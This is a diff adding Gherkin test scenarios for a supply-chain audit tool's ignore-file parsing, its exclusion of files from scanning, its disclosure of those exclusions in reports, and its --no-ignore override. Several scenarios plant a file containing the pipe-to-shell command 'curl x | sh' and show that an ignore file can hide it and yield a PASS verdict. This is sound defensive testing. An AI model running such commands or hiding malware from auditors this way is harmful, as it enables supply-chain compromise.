@@ -235,3 +235,132 @@ Feature: exosphere-audit static supply-chain audit
     Given an artefact already acquired to disk
     When it is scanned
     Then the scan core performs no network access
+
+  # ── R3: .exosphereignore parsing ──────────────────────────────────────────
+
+  @EARS-024
+  Scenario: An ignore file's comments and blank lines are ignored (happy)
+    Given a .exosphereignore containing a "# comment" line, a blank line, and "secrets.env"
+    When the ignore file is parsed
+    Then only the "secrets.env" pattern is retained
+
+  @EARS-024
+  Scenario: A leading-hash pattern with indentation is treated as a comment (unhappy)
+    Given a .exosphereignore line "   # not a pattern"
+    When the ignore file is parsed
+    Then no pattern is retained from that line
+
+  @EARS-024
+  Scenario: An ignore file that is entirely comments and blanks excludes nothing (abuse)
+    Given a .exosphereignore that is only comments and blank lines
+    When the tree is enumerated with that ignore file
+    Then no file is excluded
+
+  @EARS-025
+  Scenario: A single-star glob excludes matching files in a directory (happy)
+    Given a .exosphereignore pattern "tests/*.env"
+    When matching "tests/a.env" and "tests/sub/b.env"
+    Then "tests/a.env" is excluded and "tests/sub/b.env" is not
+
+  @EARS-025
+  Scenario: A double-star glob excludes across directory separators (happy)
+    Given a .exosphereignore pattern "corpus/**"
+    When matching "corpus/x/y/evil.sh"
+    Then the path is excluded
+
+  @EARS-025
+  Scenario: A root-anchored pattern does not match a same-named nested file (abuse)
+    Given a .exosphereignore pattern "/build.sh"
+    When matching "build.sh" and "nested/build.sh"
+    Then "build.sh" is excluded and "nested/build.sh" is not
+
+  @EARS-025
+  Scenario: A trailing-slash directory pattern excludes everything beneath it (happy)
+    Given a .exosphereignore pattern "fixtures/"
+    When matching "fixtures/mal/install.sh"
+    Then the path is excluded
+
+  @EARS-025
+  Scenario: A single-char wildcard matches exactly one character (unhappy)
+    Given a .exosphereignore pattern "a?.sh"
+    When matching "ab.sh" and "abc.sh"
+    Then "ab.sh" is excluded and "abc.sh" is not
+
+  @EARS-026
+  Scenario: A negation re-includes a file the previous pattern excluded (abuse)
+    Given a .exosphereignore with "tests/**" then "!tests/keepme.sh"
+    When matching "tests/keepme.sh" and "tests/other.sh"
+    Then "tests/keepme.sh" is NOT excluded and "tests/other.sh" is excluded
+
+  @EARS-026
+  Scenario: Last matching pattern wins when exclude follows a negation (abuse)
+    Given a .exosphereignore with "!keep.sh" then "keep.sh"
+    When matching "keep.sh"
+    Then "keep.sh" is excluded
+
+  @EARS-026
+  Scenario: A negation that matches nothing leaves other exclusions intact (unhappy)
+    Given a .exosphereignore with "*.env" then "!nothing-here.txt"
+    When matching "a.env"
+    Then "a.env" is excluded
+
+  # ── R3: exclusion from enumeration ────────────────────────────────────────
+
+  @EARS-027
+  Scenario: An excluded malicious file is never scanned (abuse)
+    Given a target whose .exosphereignore excludes "planted.sh" and "planted.sh" contains "curl x | sh"
+    When the auditor audits the target
+    Then no finding cites "planted.sh"
+    And the verdict is PASS
+
+  @EARS-027
+  Scenario: A non-excluded malicious file is still scanned (happy)
+    Given a target whose .exosphereignore excludes "docs/**" and a malicious "install.sh" at the root
+    When the auditor audits the target
+    Then a dangerous-bash finding cites "install.sh"
+
+  @EARS-028
+  Scenario: The .exosphereignore manifest is itself never scanned (abuse)
+    Given a .exosphereignore that itself contains the text "curl x | sh" in a comment
+    When the auditor audits the target
+    Then no finding cites ".exosphereignore"
+
+  # ── R3: transparency invariant ────────────────────────────────────────────
+
+  @EARS-029
+  Scenario: Excluding a malicious file discloses the exclusion in the report (abuse)
+    Given a target whose .exosphereignore excludes a planted malicious file
+    When the auditor renders the report
+    Then both the markdown and JSON disclose the excluded-file count and the excluding pattern
+
+  @EARS-029
+  Scenario: Per-pattern exclusion counts are disclosed (happy)
+    Given a .exosphereignore excluding two files by one pattern
+    When the auditor renders the report
+    Then the report shows that pattern excluded two files
+
+  @EARS-030
+  Scenario: An audit with no exclusions reports zero excluded and an empty pattern list (unhappy)
+    Given a target with no .exosphereignore
+    When the auditor renders the report
+    Then the excluded-file count is zero and the pattern list is empty
+
+  # ── R3: --no-ignore override ──────────────────────────────────────────────
+
+  @EARS-031
+  Scenario: --no-ignore forces a full scan that re-surfaces a hidden finding (abuse)
+    Given a target whose permissive .exosphereignore would exclude a planted malicious file
+    When the auditor audits the target with --no-ignore
+    Then the planted file is scanned and the verdict is BLOCK
+
+  @EARS-031
+  Scenario: --no-ignore on a clean target still passes (happy)
+    Given a benign target with a .exosphereignore
+    When the auditor audits the target with --no-ignore
+    Then the verdict is PASS and no files are excluded
+
+  @EARS-031
+  Scenario: Without --no-ignore the ignore file is honoured (unhappy)
+    Given a target whose .exosphereignore excludes a planted malicious file
+    When the auditor audits the target without --no-ignore
+    Then the planted file is excluded and the verdict is PASS
